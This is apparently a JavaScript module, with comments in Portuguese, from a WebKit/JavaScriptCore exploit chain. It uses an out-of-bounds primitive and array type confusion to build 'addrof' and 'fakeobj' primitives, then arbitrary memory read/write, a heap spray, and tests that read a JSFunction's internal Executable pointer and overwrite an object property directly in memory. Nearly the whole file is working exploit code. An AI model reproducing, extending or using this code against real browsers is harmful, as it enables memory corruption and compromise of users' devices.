// js/script3/testArrayBufferVictimCrash.mjs (v101 - R60 com Testes de Verificação Avançada)
// =======================================================================================
// ESTRATÉGIA ATUALIZADA:
// Adicionada função de teste avançado para verificar a usabilidade das primitivas de L/E.
// =======================================================================================

import { logS3, PAUSE_S3 } from './s3_utils.mjs';
import { AdvancedInt64, toHex, isAdvancedInt64Object } from '../utils.mjs';
import {
    triggerOOB_primitive,
    getOOBDataView
} from '../core_exploit.mjs';
// Importação adicionada para acessar os offsets da JSC
import { JSC_OFFSETS } from '../config.mjs';

export const FNAME_MODULE_TYPEDARRAY_ADDROF_V82_AGL_R43_WEBKIT = "Uncaged_StableRW_v101_R60";

// --- Funções de Conversão (Double <-> Int64) ---
function int64ToDouble(int64) {
    const buf = new ArrayBuffer(8);
    const u32 = new Uint32Array(buf);
    const f64 = new Float64Array(buf);
    u32[0] = int64.low();
    u32[1] = int64.high();
    return f64[0];
}

function doubleToInt64(double) {
    const buf = new ArrayBuffer(8);
    (new Float64Array(buf))[0] = double;
    const u32 = new Uint32Array(buf);
    return new AdvancedInt64(u32[0], u32[1]);
}

// =======================================================================================
// FUNÇÃO ORQUESTRADORA PRINCIPAL (IMPLEMENTAÇÃO FINAL COM VERIFICAÇÃO)
// =======================================================================================
export async function executeTypedArrayVictimAddrofAndWebKitLeak_R43() {
    const FNAME_CURRENT_TEST_BASE = FNAME_MODULE_TYPEDARRAY_ADDROF_V82_AGL_R43_WEBKIT;
    logS3(`--- Iniciando ${FNAME_CURRENT_TEST_BASE}: Implementação Final com Verificação ---`, "test");

    let final_result = { success: false, message: "A verificação funcional de L/E falhou." };

    try {
        // --- FASE 1 & 2: Obter OOB e primitivas addrof/fakeobj ---
        logS3("--- FASE 1/2: Obtendo primitivas OOB e addrof/fakeobj... ---", "subtest");
        await triggerOOB_primitive({ force_reinit: true });
        if (!getOOBDataView()) throw new Error("Falha ao obter primitiva OOB.");

        const confused_array = [13.37];
        const victim_array = [{ a: 1 }];
        const addrof = (obj) => {
            victim_array[0] = obj;
            return doubleToInt64(confused_array[0]);
        };
        const fakeobj = (addr) => {
            confused_array[0] = int64ToDouble(addr);
            return victim_array[0];
        };
        logS3("Primitivas 'addrof' e 'fakeobj' operacionais.", "good");

        // --- FASE 3: Construção da Primitiva de L/E Autocontida ---
        logS3("--- FASE 3: Construindo ferramenta de L/E autocontida ---", "subtest");
        const leaker = { obj_prop: null, val_prop: 0 };
        const leaker_addr = addrof(leaker);
        const val_prop_addr = new AdvancedInt64(leaker_addr.low() + 0x10, leaker_addr.high());
        const arb_read_final = (addr) => {
            leaker.obj_prop = fakeobj(addr);
            return doubleToInt64(leaker.val_prop);
        };
        const arb_write_final = (addr, value) => {
            leaker.obj_prop = fakeobj(addr);
            leaker.val_prop = int64ToDouble(value);
        };
        logS3("Primitivas de Leitura/Escrita Arbitrária autocontidas estão prontas.", "good");

        // --- FASE 4: Estabilização de Heap e Verificação Funcional de L/E ---
        logS3("--- FASE 4: Estabilizando Heap e Verificando L/E... ---", "subtest");
        
        const spray = [];
        for (let i = 0; i < 1000; i++) {
            spray.push({ a: 0xDEADBEEF, b: 0xCAFEBABE });
        }
        const test_obj = spray[500];
        logS3("Spray de 1000 objetos concluído para estabilização.", "info");

        const test_obj_addr = addrof(test_obj);
        const value_to_write = new AdvancedInt64(0x12345678, 0xABCDEF01);
        const prop_a_addr = new AdvancedInt64(test_obj_addr.low() + 0x10, test_obj_addr.high());
        
        logS3(`Escrevendo ${value_to_write.toString(true)} no endereço da propriedade 'a' (${prop_a_addr.toString(true)})...`, "info");
        arb_write_final(prop_a_addr, value_to_write);

        const value_read = arb_read_final(prop_a_addr);
        logS3(`>>>>> VALOR LIDO DE VOLTA: ${value_read.toString(true)} <<<<<`, "leak");

        if (value_read.equals(value_to_write)) {
            logS3("++++++++++++ SUCESSO TOTAL! O valor escrito foi lido corretamente. L/E arbitrária é 100% funcional. ++++++++++++", "vuln");
            final_result = {
                success: true,
                message: "Cadeia de exploração concluída. Leitura/Escrita arbitrária 100% funcional e verificada."
            };
        } else {
            throw new Error(`A verificação de L/E falhou. Escrito: ${value_to_write.toString(true)}, Lido: ${value_read.toString(true)}`);
        }

    } catch (e) {
        final_result.message = `Exceção na implementação funcional: ${e.message}\n${e.stack || ''}`;
        logS3(final_result.message, "critical");
    }

    logS3(`--- ${FNAME_CURRENT_TEST_BASE} Concluído ---`, "test");
    return {
        errorOccurred: final_result.success ? null : final_result.message,
        addrof_result: { success: final_result.success, msg: "Primitiva addrof funcional." },
        webkit_leak_result: { success: final_result.success, msg: final_result.message },
        heisenbug_on_M2_in_best_result: final_result.success,
        oob_value_of_best_result: 'N/A (Estratégia Uncaged)',
        tc_probe_details: { strategy: 'Uncaged Self-Contained R/W (Verified)' }
    };
}


// =======================================================================================
// NOVO CÓDIGO ADICIONADO AQUI
// =======================================================================================
/**
 * Orquestrador para testes de verificação avançada pós-obtenção de L/E.
 */
export async function runAdvancedVerificationTests() {
    const FNAME_ADV_TEST = "AdvancedVerification";
    logS3(`--- Iniciando Testes Avançados de Usabilidade de L/E (${FNAME_ADV_TEST}) ---`, "test");

    // FASE 0: Re-estabelecer as primitivas de L/E para este escopo de teste.
    // Esta parte é uma replicação da configuração bem-sucedida do log.
    await triggerOOB_primitive({ force_reinit: true });
    if (!getOOBDataView()) {
        logS3("FALHA: Não foi possível obter a primitiva OOB para os testes avançados.", "critical", FNAME_ADV_TEST);
        return;
    }
    const confused_array = [13.37];
    const victim_array = [{ a: 1 }];
    const addrof = (obj) => {
        victim_array[0] = obj;
        return doubleToInt64(confused_array[0]);
    };
    const fakeobj = (addr) => {
        confused_array[0] = int64ToDouble(addr);
        return victim_array[0];
    };
    const leaker = { obj_prop: null, val_prop: 0 };
    const leaker_addr = addrof(leaker);
    const arb_read_final = (addr) => {
        leaker.obj_prop = fakeobj(addr);
        return doubleToInt64(leaker.val_prop);
    };
    const arb_write_final = (addr, value) => {
        leaker.obj_prop = fakeobj(addr);
        leaker.val_prop = int64ToDouble(value);
    };
    logS3("Primitivas de L/E re-estabelecidas para o ambiente de teste avançado.", "good", FNAME_ADV_TEST);

    // --- TESTE 1: Leitura de Estruturas de Dados Internas (JSFunction) ---
    logS3("--- TESTE 1: Lendo a estrutura interna de um objeto JSFunction... ---", "subtest", FNAME_ADV_TEST);
    try {
        const functionForInspection = () => { let a = 1; let b = 2; return a + b; };
        const func_addr = addrof(functionForInspection);
        logS3(`Endereço de 'functionForInspection' obtido: ${func_addr.toString(true)}`, "leak", FNAME_ADV_TEST);

        // De acordo com config.mjs, o ponteiro para o código executável está no offset 0x18
        const executable_ptr_offset = new AdvancedInt64(JSC_OFFSETS.JSFunction.EXECUTABLE_OFFSET, 0);
        const executable_addr = arb_read_final(func_addr.add(executable_ptr_offset));
        logS3(`>> Ponteiro para Executable lido do offset +0x18: ${executable_addr.toString(true)}`, "leak", FNAME_ADV_TEST);

        if (executable_addr && !executable_addr.equals(new AdvancedInt64(0,0))) {
            logS3("TESTE 1 SUCESSO: O ponteiro para a estrutura Executable parece válido (não nulo).", "good", FNAME_ADV_TEST);
        } else {
            logS3("TESTE 1 FALHA: Não foi possível ler um ponteiro Executable válido.", "error", FNAME_ADV_TEST);
        }
    } catch (e) {
        logS3(`TESTE 1 ERRO: Exceção durante a inspeção da função: ${e.message}`, "critical", FNAME_ADV_TEST);
    }

    // --- TESTE 2: Modificação de Dados em Tempo de Execução ---
    logS3("--- TESTE 2: Modificando uma propriedade de objeto via escrita direta na memória... ---", "subtest", FNAME_ADV_TEST);
    try {
        const victimObject = { a: 12345.0, b: "constante" };
        logS3(`Objeto vítima antes da modificação: a = ${victimObject.a}`, "info", FNAME_ADV_TEST);

        const victim_addr = addrof(victimObject);
        // A primeira propriedade inline de um objeto JS geralmente fica no offset 0x10.
        const prop_a_addr = victim_addr.add(new AdvancedInt64(0x10, 0));
        
        const newValue = 54321.0;
        const newValueInt64 = doubleToInt64(newValue);

        logS3(`Escrevendo o novo valor (${newValue}) como Int64 (${newValueInt64.toString(true)}) em ${prop_a_addr.toString(true)}...`, "info", FNAME_ADV_TEST);
        arb_write_final(prop_a_addr, newValueInt64);

        logS3(`>> Objeto vítima DEPOIS da modificação: a = ${victimObject.a}`, "leak", FNAME_ADV_TEST);

        if (victimObject.a === newValue) {
            logS3("TESTE 2 SUCESSO: A propriedade do objeto foi modificada com sucesso via escrita arbitrária.", "vuln", FNAME_ADV_TEST);
        } else {
            logS3(`TESTE 2 FALHA: O valor da propriedade não foi alterado. Esperado: ${newValue}, Recebido: ${victimObject.a}`, "error", FNAME_ADV_TEST);
        }
    } catch (e) {
        logS3(`TESTE 2 ERRO: Exceção durante a modificação de dados: ${e.message}`, "critical", FNAME_ADV_TEST);
    }
    
    logS3(`--- Testes Avançados de Usabilidade de L/E Concluídos ---`, "test");
}
